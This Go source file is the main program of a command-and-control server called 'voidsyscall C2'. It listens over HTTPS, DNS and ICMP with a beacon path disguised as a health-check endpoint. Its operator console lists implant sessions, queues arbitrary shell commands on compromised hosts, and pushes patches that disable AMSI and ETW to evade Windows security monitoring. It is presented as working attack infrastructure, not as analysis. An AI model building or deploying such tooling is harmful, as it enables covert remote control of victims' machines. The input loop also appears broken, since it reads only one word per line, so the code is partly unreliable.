package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/VoidSecSoftwares/voidsyscall/server"
)

func parseSessionID(s string) ([16]byte, bool) {
	var id [16]byte
	decoded, err := hex.DecodeString(s)
	if err != nil {
		return id, false
	}
	if len(decoded) > 16 {
		return id, false
	}
	copy(id[:], decoded)
	return id, true
}

func main() {
	httpAddr := flag.String("http-addr", "0.0.0.0", "HTTP listen address")
	httpPort := flag.Int("https-port", 443, "HTTPS port")
	dnsAddr := flag.String("dns-addr", "0.0.0.0", "DNS listen address")
	dnsPort := flag.Int("dns-port", 53, "DNS port")
	icmpAddr := flag.String("icmp-addr", "0.0.0.0", "ICMP listen address")
	beaconPath := flag.String("path", "/api/v2/health", "Beacon endpoint path")
	certFile := flag.String("cert", "", "TLS certificate file")
	keyFile := flag.String("key", "", "TLS key file")
	flag.Parse()

	cfg := &server.ServerConfig{
		HTTPAddr:   *httpAddr,
		HTTPSPort:  *httpPort,
		DNSAddr:    *dnsAddr,
		DNSPort:    *dnsPort,
		ICMPAddr:   *icmpAddr,
		BeaconPath: *beaconPath,
		CertFile:   *certFile,
		KeyFile:    *keyFile,
	}

	if *certFile == "" || *keyFile == "" {
		fmt.Fprintln(os.Stderr, "[-] --cert and --key are required")
		os.Exit(1)
	}

	srv := server.NewServer(cfg)

	fmt.Println("╔══════════════════════════════════════════╗")
	fmt.Println("║       voidsyscall C2 — v1.0.0            ║")
	fmt.Println("║  VoidSec Softwares                       ║")
	fmt.Println("║  HTTPS / DNS / ICMP                      ║")
	fmt.Println("╚══════════════════════════════════════════╝")
	fmt.Println()

	go func() {
		for {
			var input string
			fmt.Print("voidsyscall> ")
			fmt.Scanln(&input)
			input = strings.TrimSpace(input)
			if input == "" {
				continue
			}

			parts := strings.SplitN(input, " ", 2)
			cmd := parts[0]
			var args string
			if len(parts) > 1 {
				args = parts[1]
			}

			switch cmd {
			case "sessions", "ls":
				fmt.Println(srv.ListSessions())
			case "shell":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Println("Usage: shell <session-hex> <command>")
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Println("Invalid session hex")
					continue
				}
				if err := srv.RunShell(sid, parts2[1]); err != nil {
					fmt.Printf("Error: %v\n", err)
				} else {
					fmt.Println("Task queued")
				}
			case "patch":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Println("Usage: patch <session-hex> <amsi|etw|both>")
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Println("Invalid session hex")
					continue
				}
				var patchType byte
				switch strings.ToLower(parts2[1]) {
				case "amsi":
					patchType = 0x01
				case "etw":
					patchType = 0x02
				case "both":
					patchType = 0x03
				default:
					fmt.Println("Unknown patch type")
					continue
				}
				if err := srv.PatchTarget(sid, patchType); err != nil {
					fmt.Printf("Error: %v\n", err)
				} else {
					fmt.Println("Patch task queued")
				}
			case "exit", "quit":
				fmt.Println("Shutting down...")
				os.Exit(0)
			default:
				fmt.Printf("Unknown command: %s\n", cmd)
				fmt.Println("Commands: sessions, shell, patch, exit")
			}
		}
	}()

	if err := srv.Run(); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}
